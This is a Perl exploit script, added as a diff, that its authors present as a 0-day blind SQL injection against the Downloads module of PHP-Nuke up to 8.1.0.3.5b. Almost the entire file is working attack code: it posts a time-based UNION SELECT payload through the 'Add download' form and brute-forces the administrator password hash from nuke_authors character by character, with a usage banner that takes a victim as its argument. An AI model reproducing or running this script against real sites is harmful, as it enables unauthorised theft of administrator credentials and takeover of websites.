@@ -1,0 +1,137 @@
+#!/usr/bin/perl
+# [0-Day] PHP-Nuke <= 8.1.0.3.5b (Downloads) Remote Blind SQL Injection
+# Date: 2010.07.04 after 50 days the bug was discovered.
+# Author/s: Dante90, WaRWolFz Crew
+# Crew Members: 4lasthor, Andryxxx, Cod3, Gho5t, HeRtZ, N.o.3.X, RingZero, s3rg3770, 
+#               Shades Master, V1R5, yeat
+# Special Greetings To: The:Paradox
+# Greetings To: Shotokan-The Hacker, _mRkZ_, h473
+# Web Site: www.warwolfz.org
+# My Wagend (Dante90): dante90wwz.altervista.org
+# ----
+# Why have I decided to publish this?
+# Because some nice guys (Dr.0rYX and Cr3w-DZ) have ripped and published 
+# my own exploit, with their names.
+# FU**ING LAMERS / RIPPERS / SCRIPT KIDDIE
+# ----
+
+use strict;
+use warnings;
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use HTTP::Headers;
+use Time::HiRes;
+
+my $Victime  = shift or &usage;
+my $Hash = "";
+my ($Referer,$Time,$Response);
+my ($Start,$End);
+my @chars = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+my $HostName = "http://www.victime_site.org/path/"; #Insert Victime Web Site Link
+my $Method = HTTP::Request->new(POST => $HostName.'modules.php?name=Downloads&d_op=Add');
+my $Cookies = new HTTP::Cookies;
+my $UserAgent = new LWP::UserAgent(
+			agent => 'Mozilla/5.0',
+			max_redirect => 0,
+			cookie_jar => $Cookies,
+			default_headers => HTTP::Headers->new,
+		) or die $!;
+my $WaRWolFz = "http://www.warwolfz.org/";
+my $DefaultTime = request($WaRWolFz);
+my $Post;
+
+sub Blind_SQL_Jnjection {
+	my ($dec,$hex,$Victime) = @_;
+	return "http://www.warwolfz.org/' UNION/**/SELECT IF(SUBSTRING(pwd,${dec},1)=CHAR(${hex}),benchmark(250000000,CHAR(0)),0) FROM nuke_authors WHERE aid='${Victime}";
+}
+
+for(my $I=1; $I<=32; $I++){ #N Hash characters
+	for(my $J=0; $J<=15; $J++){ #0 -> F
+		$Post = Blind_SQL_Jnjection($I,$chars[$J],$Victime);
+		$Time = request($Post);
+		sleep(3);
+		refresh($HostName, $DefaultTime, $chars[$J], $Hash, $Time, $I);
+		if ($Time > 4) {
+			$Time = request($Post);
+			refresh($HostName, $DefaultTime, $chars[$J], $Hash, $Time, $I);
+			if ($Time > 4) {
+				syswrite(STDOUT,chr($chars[$J]));
+				$Hash .= chr($chars[$J]);
+				$Time = request($Post);
+				refresh($HostName, $DefaultTime, $chars[$J], $Hash, $Time, $I);
+				last;
+			}
+		}
+	}
+	if($I == 1 && length $Hash < 1 && !$Hash){
+		print " * Exploit Failed                                       *\n";
+		print " -------------------------------------------------------- \n";
+		exit;
+	}
+	if($I == 32){
+		print " * Exploit Successfully Executed                        *\n";
+		print " -------------------------------------------------------- \n";
+		system("pause");
+	}
+}
+
+sub request{
+	$Post = $_[0];
+	$Start = Time::HiRes::time();
+	my $Response = $UserAgent->post($HostName.'modules.php?name=Downloads&d_op=Add', {
+					title => "Dante90",
+					url => $Post,
+					description => "WaRWolFz Crew",
+					auth_name => "Dante90",
+					email => "dante90.dmc4\@hotmail.it",
+					filesize => "1024",
+					version => "1",
+					homepage => "http://www.warwolfz.org/",
+					d_op => "Add"
+				}, 
+				Referer => $HostName.'modules.php?name=Downloads&d_op=Add');
+	$Response->is_success() or die "$HostName : ", $Response->message, "\n";
+	$End = Time::HiRes::time();
+	$Time = $End - $Start;
+	return $Time;
+}
+
+sub usage {
+	system("cls");
+	{
+		print " \n [0-Day] PHP-Nuke <= 8.1.0.3.5b (Downloads) Remote Blind SQL Injection Exploit\n";
+		print " -------------------------------------------------------- \n";
+		print " * USAGE:                                               *\n";
+		print " * cd [Local Disk]:\\[Directory Of Exploit]\\             *\n";
+		print " * perl name_exploit.pl [victime]                       *\n";
+		print " -------------------------------------------------------- \n";
+		print " *          Powered By Dante90, WaRWolFz Crew           *\n";
+		print " *  www.warwolfz.org - dante90_founder[at]warwolfz.org  *\n";
+		print " ------------------------------------------------------- \n";
+	};
+	exit;
+}
+
+sub refresh {
+	system("cls");
+	{
+		print " \n [0-Day] PHP-Nuke <= 8.1.0.3.5b (Downloads) Remote Blind SQL Injection Exploit\n";
+		print " -------------------------------------------------------- \n";
+		print " * USAGE:                                               *\n";
+		print " * cd [Local Disk]:\\[Directory Of Exploit]\\             *\n";
+		print " * perl name_exploit.pl [victime]                       *\n";
+		print " -------------------------------------------------------- \n";
+		print " *          Powered By Dante90, WaRWolFz Crew           *\n";
+		print " *  www.warwolfz.org - dante90_founder[at]warwolfz.org  *\n";
+		print " ------------------------------------------------------- \n";
+	};
+	print " * Victime Site: " . $_[0] . "\n";
+	print " * Default Time: " . $_[1] . " seconds\n";
+	print " * BruteForcing Hash: " . chr($_[2]) . "\n";
+	print " * BruteForcing N Char Hash: " . $_[5] . "\n";
+	print " * SQL Time: " . $_[4] . " seconds\n";
+	print " * Hash: " . $_[3] . "\n";
+}
+
+#WaRWolFz Crew
